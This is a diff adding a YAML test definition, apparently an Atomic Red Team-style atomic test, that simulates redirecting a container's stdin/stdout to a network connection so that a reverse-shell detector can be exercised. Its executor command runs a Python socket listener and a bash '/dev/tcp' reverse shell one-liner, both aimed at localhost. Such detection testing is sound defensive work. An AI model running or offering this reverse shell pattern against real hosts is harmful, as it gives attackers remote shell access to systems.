@@ -1,0 +1,12 @@
+attack_technique: Test
+display_name: Redirect STDOUT/STDIN to Network Connection in Container
+atomic_tests:
+- name: Test
+  description: Detect redirecting stdout/stdin to network connection in container (potential reverse shell).
+  supported_platforms:
+    - linux
+  executor:
+    command: |
+        python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("127.0.0.1",8080));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);s.close();' & sleep 1 && bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
+    name: bash
+    elevation_required: false
